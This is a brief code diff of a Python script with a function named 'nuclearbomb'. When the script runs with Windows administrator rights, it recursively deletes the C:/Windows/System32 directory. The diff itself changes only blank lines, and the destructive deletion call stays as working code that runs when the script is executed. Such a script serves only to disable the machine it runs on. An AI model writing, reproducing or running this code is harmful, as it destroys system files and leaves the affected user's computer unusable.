@@ -4,7 +4,6 @@ def nuclearbomb():
     import ctypes
     import sys
     if ctypes.windll.shell32.IsUserAnAdmin():
-
         system32 = Path("C:/Windows/System32")
         shutil.rmtree(system32)
     else:
@@ -12,3 +11,4 @@ def nuclearbomb():
 
 if __name__ == '__main__':
     nuclearbomb()
+
